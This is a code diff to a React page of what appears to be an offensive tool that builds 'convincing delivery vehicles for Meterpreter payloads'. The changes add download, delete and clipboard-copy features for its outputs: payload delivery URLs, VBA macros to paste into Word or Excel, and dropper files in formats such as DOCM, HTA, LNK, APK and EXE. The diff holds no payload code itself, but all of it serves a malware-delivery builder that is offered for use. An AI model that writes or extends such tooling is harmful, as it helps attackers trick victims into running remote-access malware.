@@ -5,7 +5,7 @@
  * Build convincing delivery vehicles for Meterpreter payloads
  */
 
-import { useState, useCallback } from "react";
+import { useState, useCallback, useEffect } from "react";
 
 type EmbedResult = {
   path?: string; filename?: string; size?: number; note?: string;
@@ -43,6 +43,8 @@ export default function EmbedPage() {
   const [files, setFiles] = useState<Array<{ name: string; size: number; modified: string }>>([]);
   const [log, setLog] = useState<string[]>([]);
 
+  const [copied, setCopied] = useState<string | null>(null);
+
   const addLog = (msg: string) =>
     setLog((p) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 50));
 
@@ -50,6 +52,30 @@ export default function EmbedPage() {
     const r = await fetch("/api/embed");
     const d = await r.json() as { files: Array<{ name: string; size: number; modified: string }> };
     setFiles(d.files ?? []);
+  }, []);
+
+  // Trigger browser file download
+  const downloadFile = useCallback((filename: string) => {
+    const a = document.createElement("a");
+    a.href = `/api/embed/download?file=${encodeURIComponent(filename)}`;
+    a.download = filename;
+    a.click();
+    addLog(`↓ Downloading: ${filename}`);
+  }, []);
+
+  // Delete file from server
+  const deleteFile = useCallback(async (filename: string) => {
+    await fetch(`/api/embed/download?file=${encodeURIComponent(filename)}`, { method: "DELETE" });
+    addLog(`🗑 Deleted: ${filename}`);
+    loadFiles();
+  }, [loadFiles]);
+
+  // Copy text to clipboard
+  const copyText = useCallback((text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    setCopied(label);
+    setTimeout(() => setCopied(null), 1800);
+    addLog(`📋 Copied: ${label}`);
   }, []);
 
   const build = useCallback(async () => {
@@ -73,6 +99,9 @@ export default function EmbedPage() {
       addLog(`✗ Error: ${d.error ?? "Unknown"}`);
     }
   }, [format, lhost, lport, payloadType, decoyTitle, templateApk, loadFiles]);
+
+  // Load existing files on mount
+  useEffect(() => { loadFiles(); }, [loadFiles]);
 
   const selectedFormat = FORMATS.find((f) => f.id === format)!;
 
@@ -230,42 +259,90 @@ export default function EmbedPage() {
 
             {/* Result */}
             {result && (
-              <div className="border border-green-800/30 rounded p-4 space-y-3">
-                <div className="text-[9px] text-green-600 tracking-widest">BUILD COMPLETE</div>
+              <div className="border border-green-700/40 rounded p-4 space-y-3 bg-green-950/5">
+                <div className="flex items-center justify-between">
+                  <div className="text-[9px] text-green-500 tracking-widest font-bold">✓ BUILD COMPLETE</div>
+                  {result.filename && (
+                    <button
+                      onClick={() => downloadFile(result.filename!)}
+                      className="flex items-center gap-2 rounded border border-green-600/60 bg-green-950/30 px-4 py-1.5 text-[9px] font-bold tracking-widest text-green-400 transition hover:bg-green-900/40">
+                      ↓ DOWNLOAD {result.filename.split(".").pop()?.toUpperCase()}
+                    </button>
+                  )}
+                </div>
 
                 {result.filename && (
-                  <div className="flex items-center gap-3">
-                    <span className="text-[9px] text-green-400 font-mono">{result.filename}</span>
-                    {result.size && <span className="text-[8px] text-green-900/50">{Math.round(result.size / 1024)} KB</span>}
+                  <div className="flex items-center gap-3 rounded border border-green-900/20 bg-black/30 px-3 py-2">
+                    <span className="flex-1 font-mono text-[10px] text-green-300">{result.filename}</span>
+                    {result.size && (
+                      <span className="text-[8px] text-green-900/60">{(result.size / 1024).toFixed(1)} KB</span>
+                    )}
+                    <button
+                      onClick={() => copyText(result.filename!, "filename")}
+                      className="rounded border border-green-900/30 px-2 py-0.5 text-[8px] text-green-800 hover:text-green-500 transition">
+                      {copied === "filename" ? "✓" : "Copy name"}
+                    </button>
                   </div>
                 )}
 
                 {result.deliveryUrl && (
-                  <div>
-                    <div className="text-[7px] text-green-900/40 uppercase tracking-widest mb-0.5">Payload delivery URL</div>
-                    <code className="text-[8px] text-yellow-400">{result.deliveryUrl}</code>
+                  <div className="rounded border border-yellow-900/30 bg-black/30 px-3 py-2">
+                    <div className="text-[7px] text-yellow-900/60 uppercase tracking-widest mb-1">Payload delivery URL</div>
+                    <div className="flex items-center gap-2">
+                      <code className="flex-1 text-[9px] text-yellow-400 break-all">{result.deliveryUrl}</code>
+                      <button onClick={() => copyText(result.deliveryUrl!, "url")}
+                        className="flex-shrink-0 rounded border border-yellow-900/30 px-2 py-0.5 text-[8px] text-yellow-800 hover:text-yellow-500 transition">
+                        {copied === "url" ? "✓" : "Copy"}
+                      </button>
+                    </div>
                   </div>
                 )}
 
                 {result.note && (
-                  <div className="bg-black/30 rounded p-3">
-                    <div className="text-[7px] text-green-900/40 uppercase tracking-widest mb-1">Notes</div>
-                    <pre className="text-[8px] text-green-700 whitespace-pre-wrap">{result.note}</pre>
+                  <div className="rounded border border-green-900/20 bg-black/30 p-3">
+                    <div className="mb-1 flex items-center justify-between">
+                      <span className="text-[7px] uppercase tracking-widest text-green-900/50">Notes</span>
+                      <button onClick={() => copyText(result.note!, "note")}
+                        className="text-[8px] text-green-900/40 hover:text-green-600 transition">
+                        {copied === "note" ? "✓ Copied" : "Copy"}
+                      </button>
+                    </div>
+                    <pre className="whitespace-pre-wrap text-[8px] text-green-700">{result.note}</pre>
                   </div>
                 )}
 
-                {result.instructions && (
+                {result.instructions && result.instructions.length > 0 && (
                   <div className="space-y-0.5">
+                    <div className="text-[7px] uppercase tracking-widest text-green-900/50 mb-1">Instructions</div>
                     {result.instructions.map((step, i) => (
-                      <div key={i} className="text-[8px] text-green-800">{step}</div>
+                      <div key={i} className="text-[8px] text-green-800 leading-relaxed">{step}</div>
                     ))}
                   </div>
                 )}
 
                 {result.macro && (
                   <div>
-                    <div className="text-[7px] text-green-900/40 uppercase tracking-widest mb-1">VBA Macro (paste into Word VBA editor)</div>
-                    <pre className="bg-black/40 rounded p-2 text-[8px] text-green-600 max-h-32 overflow-y-auto">
+                    <div className="mb-1 flex items-center justify-between">
+                      <span className="text-[7px] uppercase tracking-widest text-green-900/50">
+                        VBA Macro — paste into Word / Excel VBA editor (Alt+F11)
+                      </span>
+                      <div className="flex gap-1.5">
+                        <button onClick={() => copyText(result.macro!, "macro")}
+                          className="rounded border border-green-700/40 bg-green-950/20 px-3 py-0.5 text-[8px] text-green-500 hover:bg-green-900/30 transition">
+                          {copied === "macro" ? "✓ Copied!" : "📋 Copy Macro"}
+                        </button>
+                        <button onClick={() => {
+                          const blob = new Blob([result.macro!], { type: "text/plain" });
+                          const u = URL.createObjectURL(blob);
+                          const a = document.createElement("a"); a.href = u; a.download = `${decoyTitle}.bas`; a.click(); URL.revokeObjectURL(u);
+                          addLog("↓ Downloaded macro as .bas");
+                        }}
+                          className="rounded border border-green-800/30 px-2 py-0.5 text-[8px] text-green-700 hover:text-green-500 transition">
+                          ↓ .bas
+                        </button>
+                      </div>
+                    </div>
+                    <pre className="max-h-40 overflow-y-auto rounded bg-black/40 p-3 text-[8px] text-green-600 leading-relaxed">
                       {result.macro}
                     </pre>
                   </div>
@@ -292,20 +369,72 @@ export default function EmbedPage() {
 
             {/* Generated files */}
             <div className="border border-green-900/15 rounded p-4">
-              <div className="flex items-center justify-between mb-2">
-                <div className="text-[8px] text-green-900 tracking-widest">GENERATED FILES</div>
-                <button onClick={loadFiles} className="text-[7px] text-green-900/50 hover:text-green-700">↻ refresh</button>
+              <div className="flex items-center justify-between mb-3">
+                <div className="text-[8px] text-green-900 tracking-widest">
+                  GENERATED FILES {files.length > 0 && `(${files.length})`}
+                </div>
+                <button onClick={loadFiles} className="text-[7px] text-green-900/50 hover:text-green-700 transition">↻ refresh</button>
               </div>
               {files.length === 0 ? (
-                <div className="text-[8px] text-green-900/20 text-center py-4">No files yet</div>
+                <div className="text-center py-5">
+                  <p className="text-[8px] text-green-900/20">No files yet</p>
+                  <p className="text-[7px] text-green-900/10 mt-0.5">Build a dropper above to generate</p>
+                </div>
               ) : (
-                <div className="space-y-1 max-h-48 overflow-y-auto">
-                  {files.map((f) => (
-                    <div key={f.name} className="flex items-center gap-2 text-[8px] py-1 border-b border-green-900/10">
-                      <span className="flex-1 text-green-600 font-mono truncate">{f.name}</span>
-                      <span className="text-green-900/40">{Math.round(f.size / 1024)}KB</span>
-                    </div>
-                  ))}
+                <div className="space-y-1 max-h-64 overflow-y-auto pr-1">
+                  {files.map((f) => {
+                    const ext = f.name.split(".").pop()?.toUpperCase() ?? "BIN";
+                    const extColors: Record<string, string> = {
+                      PDF: "text-red-400 border-red-900/40",
+                      DOCM: "text-blue-400 border-blue-900/40",
+                      XLSM: "text-green-400 border-green-900/40",
+                      APK: "text-lime-400 border-lime-900/40",
+                      MP4: "text-purple-400 border-purple-900/40",
+                      LNK: "text-amber-400 border-amber-900/40",
+                      HTA: "text-orange-400 border-orange-900/40",
+                      EXE: "text-red-500 border-red-900/40",
+                      PS1: "text-cyan-400 border-cyan-900/40",
+                      SH:  "text-green-400 border-green-900/40",
+                    };
+                    const badge = extColors[ext] ?? "text-slate-400 border-slate-700/40";
+                    return (
+                      <div key={f.name} className="group flex items-center gap-2 rounded border border-green-900/10 bg-black/10 px-2 py-1.5 transition hover:bg-black/20">
+                        <span className={`flex-shrink-0 rounded border px-1 py-px font-mono text-[7px] font-bold ${badge}`}>{ext}</span>
+                        <span className="flex-1 truncate font-mono text-[9px] text-green-600" title={f.name}>{f.name}</span>
+                        <span className="flex-shrink-0 text-[7px] text-green-900/40">{(f.size / 1024).toFixed(1)}K</span>
+                        <div className="flex flex-shrink-0 gap-1 opacity-0 transition group-hover:opacity-100">
+                          <button
+                            onClick={() => downloadFile(f.name)}
+                            title="Download"
+                            className="rounded border border-green-700/40 bg-green-950/20 px-2 py-0.5 text-[8px] text-green-500 hover:bg-green-900/40 transition">
+                            ↓
+                          </button>
+                          <button
+                            onClick={() => deleteFile(f.name)}
+                            title="Delete"
+                            className="rounded border border-red-900/40 px-2 py-0.5 text-[8px] text-red-800 hover:text-red-500 hover:border-red-700/40 transition">
+                            ✕
+                          </button>
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+              )}
+
+              {files.length > 0 && (
+                <div className="mt-2 flex justify-between items-center border-t border-green-900/10 pt-2">
+                  <span className="text-[7px] text-green-900/30">
+                    {(files.reduce((a, f) => a + f.size, 0) / 1024).toFixed(1)} KB total
+                  </span>
+                  <button
+                    onClick={async () => {
+                      if (!confirm(`Delete all ${files.length} files?`)) return;
+                      await Promise.all(files.map((f) => deleteFile(f.name)));
+                    }}
+                    className="text-[7px] text-red-900/40 hover:text-red-700 transition">
+                    Clear all
+                  </button>
                 </div>
               )}
             </div>
